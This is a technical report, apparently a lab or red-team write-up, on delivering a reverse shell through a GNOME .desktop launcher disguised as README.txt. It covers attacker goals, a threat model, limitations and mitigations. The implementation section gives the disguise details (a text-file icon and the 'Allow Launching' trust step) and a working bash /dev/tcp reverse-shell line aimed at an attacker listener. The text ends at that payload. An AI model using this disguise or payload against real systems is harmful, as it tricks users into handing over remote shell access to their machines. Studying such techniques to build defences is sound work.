# Technical Report: Reverse Shell Delivery via `.desktop` Launcher

## Overview

This report documents the creation, behavior, and deployment of a user-level reverse shell payload disguised as an innocent-looking file named `README.txt`. The file is implemented using a `.desktop` launcher file on Ubuntu, designed to socially engineer a user into executing it.

---

## Objective

- Disguise an executable reverse shell as a trusted, text-based document  
- Deliver the payload in a single file, with no external dependencies  
- Trigger a reverse shell back to a Kali Linux listener upon click

---

## Threat Model

### Attacker Goals

- Gain an interactive remote shell on the target system  
- Maintain stealth through social engineering and file disguise  
- Avoid detection by not requiring administrative privileges or file downloads  

### Assumptions

- The victim uses a GNOME-based Linux desktop (e.g., Ubuntu)  
- The user allows execution of `.desktop` files from their Desktop  
- The user is socially engineered into trusting and launching the disguised file  
- The target machine has outbound network access to the attacker's listener  

### Attacker Capabilities

- Ability to craft a malicious `.desktop` launcher with a reverse shell payload  
- Means of delivering the file to the target (e.g., via USB, phishing, shared folder)  
- Control over a listener machine to receive incoming connections (Kali with `nc`)  

### Victim Environment

- User operates under a non-restricted Linux desktop environment  
- No outbound firewall blocking the reverse shell connection  
- Default GNOME behavior is intact (trust prompt on `.desktop` files)  

### Limitations

- Requires user interaction (file must be trusted and launched)  
- The payload runs with the user’s privileges (not root)  
- Network-dependent: reverse shell fails if outbound traffic is blocked  
- Easily readable and discoverable if inspected manually  

### Mitigations

- Disable `.desktop` file execution from user-writable directories  
- Enforce outbound firewall rules or use network segmentation  
- Harden user awareness through training against disguised file traps  
- Enable AppArmor/SELinux rules that restrict arbitrary shell access  

---

## Implementation Details

### File: `README.txt.desktop`

- **Filename shown to user:** `README.txt`  
- **Real extension:** `.desktop` (GNOME launcher)  
- **Icon used:** `text-x-generic` (appears like a text file)  
- **Trust method:** GNOME “Allow Launching” system  

### Payload Logic

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.14/6969 0>&1'
